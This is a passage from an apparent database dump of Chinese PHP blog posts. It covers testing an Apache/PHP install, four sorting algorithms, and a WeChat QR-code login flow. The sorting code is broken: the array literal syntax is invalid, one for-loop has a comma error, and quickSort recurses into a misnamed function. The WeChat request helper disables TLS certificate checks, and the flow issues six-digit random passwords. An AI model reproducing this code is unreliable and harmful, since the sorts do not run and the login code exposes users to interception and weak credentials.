font-size: 13.92px; line-height: 20.88px;\">9.<span style=\"background-color: rgb(255, 255, 255);\">测试安装</span></span></p><pre><code class=\"language-css\">#重启Apache\r\nservice&nbsp;httpd&nbsp;restart&nbsp;或&nbsp;/usr/local/apache2/bin/apachectl&nbsp;restart\r\n#写入&lt;?php&nbsp;echo&nbsp;phpinfo();?&gt;\r\nvim&nbsp;/usr/local/apache2/htdoc/phpinfo.php</code></pre><p><span style=\"color: rgb(0, 176, 80); font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 13.92px; line-height: 20.88px;\"><span style=\"background-color: rgb(255, 255, 255);\"></span></span>安装完成！另外贴上其它几个环境的安装教程：</p><p>LNMP：<a href=\"http://www.centoscn.com/CentosServer/www/2015/0422/5245.html\" target=\"_blank\" title=\"centos6.5编译安装LNMP架构web环境\">centos6.5编译安装LNMP架构web环境</a></p><p>WNMP：<a href=\"http://wenku.baidu.com/link?url=heceI1Dj-1dx2m5uxwGmN88mff8YQgTxGCle1Sggg7mvrpLzUgD-ajP_qqCdz2zTug7upQSLQo3bMGHE66Tpn2swuvwbeZQBArff4YjVr6O\" target=\"_blank\" title=\"windows下安装nginx+php+mysql\">windows下安装nginx+php+mysql</a></p>',1445565985,'2016-10-14 08:46:02','0000-00-00 00:00:00',4,0,1,6,'http://7xq09h.com1.z0.glb.clouddn.com/20151223_1450849619_625479.jpg?imageView2/1/w/210/h/140'),(107,0,'php','Leunico','PHP排序算法实现的几种方法','所谓排序，就是使一串记录，按照其中的某个或某些关键字的大小，递增或递减的排列起来的操作。排序算法，就是如何使得记录按照要求排列的方法。','PHP排序算法','PHP排序算法实现讲解,插入排序法,冒泡排序法,选择排序法,快速排序法,PHP实现排序代码','PHP排序方法','排序',388,'<p><span style=\"color: rgb(85, 85, 85); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, Arial, &#39;Open Sans&#39;, SimSun, sans-serif; font-size: 15px; line-height: 25px; background-color: rgb(255, 255, 255);\"><img style=\"border-radius:4px;\" src=\"http://leunico-upload.stor.sinaapp.com/image/20151223_1450856792_911551.jpg\" title=\"20151223_1450856792_911551.jpg\" alt=\"6598120899772334450.jpg\"/></span></p><p><span style=\"color: rgb(85, 85, 85); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, Arial, &#39;Open Sans&#39;, SimSun, sans-serif; font-size: 15px; line-height: 25px; background-color: rgb(255, 255, 255);\">所谓排序，就是使一串记录，按照其中的某个或某些关键字的大小，递增或递减的排列起来的操作。排序算法，就是如何使得记录按照要求排列的方法。排序算法在很多领域得到相当地重视，尤其是在大量数据的处理方面。一个优秀的算法可以节省大量的资源。在各个领域中考虑到数据的各种限制和规范，要得到一个符合实际的优秀算法，得经过大量的推理和分析。</span><br/></p><p><span style=\"color: rgb(85, 85, 85); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, Arial, &#39;Open Sans&#39;, SimSun, sans-serif; font-size: 15px; line-height: 25px; background-color: rgb(255, 255, 255);\">分别使用插入排序法，冒泡排序法，选择排序法，快速排序法，将数组中的值进行按照从小到大的顺序进行排序</span></p><pre><code class=\"language-css\">$arr(12,43,57,32,51,76,36,91,28,46,40);</code></pre><p><span style=\"color: rgb(85, 85, 85); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, Arial, &#39;Open Sans&#39;, SimSun, sans-serif; font-size: 15px; line-height: 25px; background-color: rgb(255, 255, 255);\"></span></p><p style=\"box-sizing: border-box; margin-top: 0px; margin-bottom: 0px; padding: 0px; border: none; outline: 0px; font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, Arial, &#39;Open Sans&#39;, SimSun, sans-serif; list-style: none; font-size: 15px; line-height: 25px; color: rgb(85, 85, 85); white-space: normal; background: rgb(255, 255, 255);\">1、插入排序法</p><p style=\"box-sizing: border-box; margin-top: 0px; margin-bottom: 0px; padding: 0px; border: none; outline: 0px; font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, Arial, &#39;Open Sans&#39;, SimSun, sans-serif; list-style: none; font-size: 15px; line-height: 25px; color: rgb(85, 85, 85); white-space: normal; background: rgb(255, 255, 255);\">分析：既定前面数字已经排好顺序，现在要把第n个数字插入到前面有序的数组中，使得这n个数字也是有序的放入其中，如此反复循环直至全部排好顺序。</p><p style=\"box-sizing: border-box; margin-top: 0px; margin-bottom: 0px; padding: 0px; border: none; outline: 0px; font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, Arial, &#39;Open Sans&#39;, SimSun, sans-serif; list-style: none; font-size: 15px; line-height: 25px; color: rgb(85, 85, 85); white-space: normal; background: rgb(255, 255, 255);\">具体代码实现如下：</p><pre><code class=\"language-css\">$arr(12,43,57,32,51,76,36,91,28,46,40);\r\nfunction&nbsp;insertSort($arr)&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;$len=count($arr);&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;for($i=1,&nbsp;$i&lt;$len;&nbsp;$i++)&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$tmp&nbsp;=&nbsp;$arr[$i];\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for($j=$i-1;$j&gt;=0;$j--)&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($tmp&nbsp;&lt;&nbsp;$arr[$j])&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//比较大小当数字小时交换位置，将后面的数字与前面的数字进行互换操作\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$arr[$j+1]&nbsp;=&nbsp;$arr[$j];\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$arr[$j]&nbsp;=&nbsp;$tmp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//不需要，直接跳过\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$arr;\r\n}</code></pre><p><span style=\"color: rgb(85, 85, 85); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, Arial, &#39;Open Sans&#39;, SimSun, sans-serif; font-size: 15px; line-height: 25px; background-color: rgb(255, 255, 255);\"></span></p><p style=\"box-sizing: border-box; margin-top: 0px; margin-bottom: 0px; padding: 0px; border: none; outline: 0px; font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, Arial, &#39;Open Sans&#39;, SimSun, sans-serif; list-style: none; font-size: 15px; line-height: 25px; color: rgb(85, 85, 85); white-space: normal; background: rgb(255, 255, 255);\">2、冒泡排序法</p><p style=\"box-sizing: border-box; margin-top: 0px; margin-bottom: 0px; padding: 0px; border: none; outline: 0px; font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, Arial, &#39;Open Sans&#39;, SimSun, sans-serif; list-style: none; font-size: 15px; line-height: 25px; color: rgb(85, 85, 85); white-space: normal; background: rgb(255, 255, 255);\">分析：从前往后对相邻的两个数字依次进行比较调整，让较大的数字往下沉，让较小的数字往上升，即每相邻的数字进行对比排序，顺序不符合时将其调换位置。</p><p style=\"box-sizing: border-box; margin-top: 0px; margin-bottom: 0px; padding: 0px; border: none; outline: 0px; font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, Arial, &#39;Open Sans&#39;, SimSun, sans-serif; list-style: none; font-size: 15px; line-height: 25px; color: rgb(85, 85, 85); white-space: normal; background: rgb(255, 255, 255);\">具体代码实现如下：</p><pre><code class=\"language-css\">$arr(12,43,57,32,51,76,36,91,28,46,40);\r\nfunction&nbsp;bubbleSort($arr)\r\n{&nbsp;&nbsp;\r\n&nbsp;&nbsp;$len=count($arr);\r\n&nbsp;&nbsp;for($i=1;$i&lt;$len;$i++)\r\n&nbsp;&nbsp;{&nbsp;//循环比较次数\r\n&nbsp;&nbsp;&nbsp;&nbsp;for($k=0;$k&lt;$len-$i;$k++)\r\n&nbsp;&nbsp;&nbsp;&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($arr[$k]&gt;$arr[$k+1])\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$tmp=$arr[$k+1];\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$arr[$k+1]=$arr[$k];\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$arr[$k]=$tmp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;}\r\n&nbsp;&nbsp;return&nbsp;$arr;\r\n}</code></pre><p style=\"box-sizing: border-box; margin-top: 0px; margin-bottom: 0px; padding: 0px; border: none; outline: 0px; font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, Arial, &#39;Open Sans&#39;, SimSun, sans-serif; list-style: none; font-size: 15px; line-height: 25px; color: rgb(85, 85, 85); white-space: normal; background: rgb(255, 255, 255);\">3、选择排序法</p><p style=\"box-sizing: border-box; margin-top: 0px; margin-bottom: 0px; padding: 0px; border: none; outline: 0px; font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, Arial, &#39;Open Sans&#39;, SimSun, sans-serif; list-style: none; font-size: 15px; line-height: 25px; color: rgb(85, 85, 85); white-space: normal; background: rgb(255, 255, 255);\">分析：选出最小的一个数字与第一个位置数字交换，之后再剩余的数当中再次找到最小的数字与第二个位置交换，依此循环到倒数第二个数字和最后一个数字比较结束为止。</p><p style=\"box-sizing: border-box; margin-top: 0px; margin-bottom: 0px; padding: 0px; border: none; outline: 0px; font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, Arial, &#39;Open Sans&#39;, SimSun, sans-serif; list-style: none; font-size: 15px; line-height: 25px; color: rgb(85, 85, 85); white-space: normal; background: rgb(255, 255, 255);\">具体代码实现如下：</p><pre><code class=\"language-css\">$arr(12,43,57,32,51,76,36,91,28,46,40);\r\nfunction&nbsp;selectSort($arr)&nbsp;{\r\n&nbsp;$len=count($arr);\r\n&nbsp;&nbsp;&nbsp;&nbsp;for($i=0;&nbsp;$i&lt;$len-1;&nbsp;$i++)&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//假设最小值的位置\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$p&nbsp;=&nbsp;$i;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for($j=$i+1;&nbsp;$j&lt;$len;&nbsp;$j++)&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//$arr[$p]&nbsp;已知的最小值\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($arr[$p]&nbsp;&gt;&nbsp;$arr[$j])&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//比较发现更小的记录下最小值的位置，并且在下次比较时采用已知的最小值进行比较。\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$p&nbsp;=&nbsp;$j;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//确定当前最小值的位置，保存到$p中。如果发现最小值的位置与当前假设的位置$i不同，则位置互换即可。\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($p&nbsp;!=&nbsp;$i)&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$tmp&nbsp;=&nbsp;$arr[$p];\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$arr[$p]&nbsp;=&nbsp;$arr[$i];\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$arr[$i]&nbsp;=&nbsp;$tmp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$arr;\r\n}</code></pre><p style=\"box-sizing: border-box; margin-top: 0px; margin-bottom: 0px; padding: 0px; border: none; outline: 0px; font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, Arial, &#39;Open Sans&#39;, SimSun, sans-serif; list-style: none; font-size: 15px; line-height: 25px; color: rgb(85, 85, 85); white-space: normal; background: rgb(255, 255, 255);\">4、快速排序法</p><p style=\"box-sizing: border-box; margin-top: 0px; margin-bottom: 0px; padding: 0px; border: none; outline: 0px; font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, Arial, &#39;Open Sans&#39;, SimSun, sans-serif; list-style: none; font-size: 15px; line-height: 25px; color: rgb(85, 85, 85); white-space: normal; background: rgb(255, 255, 255);\">分析：通过一趟排序将要排序的数据分割成独立的两部分，其中一部分的所有数据都比另外一部分的所有数据都要小，然后再按此方法对这两部分数据分别进行快速排序，整个排序过程可以递归进行，以此达到整个数据变成有序序列。</p><p style=\"box-sizing: border-box; margin-top: 0px; margin-bottom: 0px; padding: 0px; border: none; outline: 0px; font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, Arial, &#39;Open Sans&#39;, SimSun, sans-serif; list-style: none; font-size: 15px; line-height: 25px; color: rgb(85, 85, 85); white-space: normal; background: rgb(255, 255, 255);\">具体代码实现如下：</p><pre><code class=\"language-css\">$arr(12,43,57,32,51,76,36,91,28,46,40);\r\nfunction&nbsp;quickSort($arr)&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;//判断是否继续进行\r\n&nbsp;&nbsp;&nbsp;&nbsp;$length&nbsp;=&nbsp;count($arr);\r\n&nbsp;&nbsp;&nbsp;&nbsp;if($length&nbsp;&lt;=&nbsp;1)&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$arr;\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;//选择第一个数字作为基准\r\n&nbsp;&nbsp;&nbsp;&nbsp;$base_num&nbsp;=&nbsp;$arr[0];\r\n&nbsp;&nbsp;&nbsp;&nbsp;//遍历除了基准外的所有数字，按照大小关系放入两个数组内，之后初始化两个数组\r\n&nbsp;&nbsp;&nbsp;&nbsp;$left_array&nbsp;=&nbsp;array();&nbsp;&nbsp;//小于基准\r\n&nbsp;&nbsp;&nbsp;&nbsp;$right_array&nbsp;=&nbsp;array();&nbsp;&nbsp;//大于基准\r\n&nbsp;&nbsp;&nbsp;&nbsp;for($i=1;&nbsp;$i&lt;$length;&nbsp;$i++)&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($base_num&nbsp;&gt;&nbsp;$arr[$i])&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//放入左边数组\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$left_array[]&nbsp;=&nbsp;$arr[$i];\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//放入右边数组\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$right_array[]&nbsp;=&nbsp;$arr[$i];\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;//分别对两数组进行相同的排序处理方式递归\r\n&nbsp;&nbsp;&nbsp;&nbsp;$left_array&nbsp;=&nbsp;quick_sort($left_array);\r\n&nbsp;&nbsp;&nbsp;&nbsp;$right_array&nbsp;=&nbsp;quick_sort($right_array);\r\n&nbsp;&nbsp;&nbsp;&nbsp;//合并数组\r\n&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;array_merge($left_array,&nbsp;array($base_num),&nbsp;$right_array);\r\n}</code></pre><p>本文转载：<a href=\"http://www.yoodb.com/article/display/295\" style=\"box-sizing: border-box; color: rgb(170, 170, 170); text-decoration: none; margin: 0px; padding: 0px; border: 0px; outline: 0px; font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, Arial, &#39;Open Sans&#39;, SimSun, sans-serif; list-style: none; font-size: 12px; vertical-align: baseline; transition: all 0.2s ease; cursor: pointer; line-height: 25px; text-align: center; white-space: normal; background-image: initial; background-attachment: initial; background-size: initial; background-origin: initial; background-clip: initial; background-position: initial; background-repeat: initial;\">http://www.yoodb.com/article/display/295</a></p>',1445846503,'2016-11-15 16:43:08','0000-00-00 00:00:00',3,0,1,24,'http://7xq09h.com1.z0.glb.clouddn.com/20151223_1450856792_911551.jpg?imageView2/1/w/210/h/140'),(108,1,'php','一只特立独行的猪2号','用微信测试帐号实现微信扫一扫登录和注册','微信扫一扫登录本来是微信开放平台的功能，要想使用这个功能也可以，300大洋加开发者认证...所以我使用的并不是这个，而是根据二维码带的scene_id再结合后台数据遍历实现的，这样只要公众号有部分接口权限就完全可以实现。','微信扫一扫登录方法','非微信开放平台用微信测试帐号实现微信扫一扫登录和注册的方法','扫一扫，微信登录','微信',751,'<p><img style=\"border-radius:4px;\" src=\"http://leunico-upload.stor.sinaapp.com/image/20151218_1450403060_184868.jpg\" title=\"20151218_1450403060_184868.jpg\" alt=\"dear-santa.jpg\"/></p><p>首先，微信扫一扫登录本来是微信开放平台的功能，要想使用这个功能也可以，300大洋加开发者认证...所以我使用的并不是这个，而是根据二维码带的scene_id再结合后台数据遍历实现的，这样只要公众号有部分接口权限就完全可以实现。流程如下</p><p>第一步，登录页面获取带参数(scene_id由我设定)的二维码。</p><pre><code class=\"language-css\">$appid//公众平台应用ID\r\n$appsecret//公众平台应用密钥\r\n\r\n#先获取Access&nbsp;Token\r\n//这是获取Access&nbsp;Token的url\r\n$url&nbsp;=&nbsp;&quot;https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&amp;appid=&quot;.$appid.&quot;&amp;secret=&quot;.$appsecret;\r\n//使用http请求\r\n$res&nbsp;=&nbsp;https_request($url);&nbsp;\r\n$result&nbsp;=&nbsp;json_decode($res,&nbsp;true);&nbsp;\r\n$access_token&nbsp;=&nbsp;$result[&quot;access_token&quot;];\r\n\r\n#得到Access&nbsp;Token后便可以取二维码了\r\n//$scene_id就是我生成的二维码参数，放到二维码中&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n$qrcode&nbsp;=&nbsp;&#39;{&quot;expire_seconds&quot;:&nbsp;1800,&quot;action_name&quot;:&nbsp;&quot;QR_SCENE&quot;,&quot;action_info&quot;:&nbsp;{&quot;scene&quot;:&nbsp;{&quot;scene_id&quot;:&#39;.$scene_id.&#39;}}}&#39;;\r\n//获取二维码ticket\r\n$url&nbsp;=&nbsp;&quot;https://api.weixin.qq.com/cgi-bin/qrcode/create?access_token=&quot;.$access_token;\r\n\r\n$result&nbsp;=&nbsp;https_request($url,$qrcode);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n$jsoninfo&nbsp;=&nbsp;json_decode($result,true);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n$ticket&nbsp;=&nbsp;$jsoninfo[&quot;ticket&quot;];\r\n//下面就是二维码的src链接&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n$imageSrc&nbsp;=&nbsp;&quot;https://mp.weixin.qq.com/cgi-bin/showqrcode?ticket=$image&quot;;\r\n#第一步就完成了。\r\n\r\n#这是http请求方法，整个过程都会用到\r\npublic&nbsp;function&nbsp;https_request($url,&nbsp;$data&nbsp;=&nbsp;null){&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$curl&nbsp;=&nbsp;curl_init();\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl_setopt($curl,&nbsp;CURLOPT_URL,&nbsp;$url);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl_setopt($curl,&nbsp;CURLOPT_SSL_VERIFYPEER,&nbsp;FALSE);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl_setopt($curl,&nbsp;CURLOPT_SSL_VERIFYHOST,&nbsp;FALSE);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(!empty($data)){\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl_setopt($curl,&nbsp;CURLOPT_POST,&nbsp;1);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl_setopt($curl,&nbsp;CURLOPT_POSTFIELDS,&nbsp;$data);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl_setopt($curl,&nbsp;CURLOPT_RETURNTRANSFER,&nbsp;1);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$output&nbsp;=&nbsp;curl_exec($curl);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl_close($curl);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$output;\r\n}</code></pre><p>第二步，当二维码有微信号扫描时，这个事件是有两种情况的。</p><ol class=\" list-paddingleft-2\" style=\"list-style-type: decimal;\"><li><p><span style=\"color: rgb(51, 51, 51);font-size: 14px; line-height: 18px; background-color: rgb(255, 255, 255);\">如果用户还未关注公众号，则用户可以关注公众号，关注后微信会将带场景值关注事件推送给开发者。</span></p></li><li><p><span style=\"color: rgb(51, 51, 51);font-size: 14px; line-height: 18px; background-color: rgb(255, 255, 255);\">如果用户已经关注公众号，在用户扫描后会自动进入会话，微信也会将带场景值扫描事件推送给开发者。</span><br/></p></li></ol><p>获取微信事件这看SDK就行了，说下获取后的处理。<br/></p><pre><code class=\"language-css\">case&nbsp;&quot;subscribe&quot;:&nbsp;//&nbsp;事件1&nbsp;\r\n&nbsp;&nbsp;&nbsp;//数据处理类&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;$weixin&nbsp;=&nbsp;new&nbsp;class_weixin_adv();\r\n&nbsp;&nbsp;&nbsp;//根据openid得到用户数据\r\n&nbsp;&nbsp;&nbsp;$info&nbsp;=&nbsp;$weixin-&gt;get_user_info($object-&gt;FromUserName);\r\n&nbsp;&nbsp;&nbsp;//生成用户登录的密码,只有手机端用户才能看到\r\n&nbsp;&nbsp;&nbsp;$password&nbsp;=&nbsp;rand(100,999).rand(100,999);\r\n&nbsp;&nbsp;&nbsp;//将用户数据存入数据库\r\n&nbsp;&nbsp;&nbsp;$return&nbsp;=&nbsp;SetUser($object-&gt;FromUserName,$info[&quot;nickname&quot;],$password);\r\n&nbsp;&nbsp;&nbsp;//辨别openid过滤非微信端的请求\r\n&nbsp;&nbsp;&nbsp;if($info[&quot;nickname&quot;]&nbsp;==&nbsp;&#39;&#39;)&nbsp;$return&nbsp;=&nbsp;NULL;\r\n&nbsp;&nbsp;&nbsp;//判断用户是否以前关注过此公众号\r\n&nbsp;&nbsp;&nbsp;if&nbsp;(isset($return)){\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(is_array($return)){\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$contentStr&nbsp;=&nbsp;&quot;你已经关注且注册过帐号\\n请再扫描二维码登录......\\n帐号是:&quot;.$return[0][&quot;username&quot;];&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}else{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$contentStr&nbsp;=&nbsp;&quot;欢迎关注Leunico测试帐号\\n请再扫描二维码登录......\\n帐号:&quot;.$info[&quot;nickname&quot;].&quot;\\n密码:&quot;.$password;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;}else{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$contentStr&nbsp;=&nbsp;&quot;不是有效的openid,请在手机端操作!!openid是:&quot;.$object-&gt;FromUserName;\r\n&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;break;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\ncase&nbsp;&quot;unsubscribe&quot;://&nbsp;取消关注事件\r\n&nbsp;&nbsp;&nbsp;$contentStr&nbsp;&nbsp;=&nbsp;&quot;取消关注&quot;;\r\n&nbsp;&nbsp;&nbsp;break;\r\ncase&nbsp;&quot;SCAN&quot;:&nbsp;//&nbsp;事件2\r\n&nbsp;&nbsp;&nbsp;$weixin&nbsp;=&nbsp;new&nbsp;class_weixin_adv();\r\n&nbsp;&nbsp;&nbsp;$info&nbsp;=&nbsp;$weixin-&gt;get_user_info($object-&gt;FromUserName);\r\n&nbsp;&nbsp;&nbsp;//根据扫描者的openid获取用户数据\r\n&nbsp;&nbsp;&nbsp;$return&nbsp;=&nbsp;GetUser($object-&gt;FromUserName);\r\n&nbsp;&nbsp;&nbsp;if(!empty($return)){\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#这里是关键，向数据库存入带scene_id的数据，前台就是遍历这个数据\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SetweixinUser($object-&gt;FromUserName,$info[&quot;nickname&quot;],$object-&gt;EventKey);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$contentStr&nbsp;&nbsp;=&nbsp;$info[&quot;nickname&quot;].&quot;在AliceBlog的帐号登录了~~\\n幸运数字:&quot;.$object-&gt;EventKey;\r\n&nb